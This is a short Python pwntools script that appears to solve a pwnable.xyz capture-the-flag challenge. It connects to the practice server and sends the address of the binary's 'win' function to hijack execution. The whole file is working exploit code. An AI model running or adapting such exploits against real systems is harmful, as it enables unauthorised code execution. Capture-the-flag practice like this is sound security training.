from pwn import *

elf = context.binary = ELF('./challenge')
context.log_level = 'debug'

p = remote('svc.pwnable.xyz', 30002)

p.sendlineafter(':', f'{elf.sym.win} 0 13')
p.sendlineafter(':', p64(0))

print(p.recvall().decode())
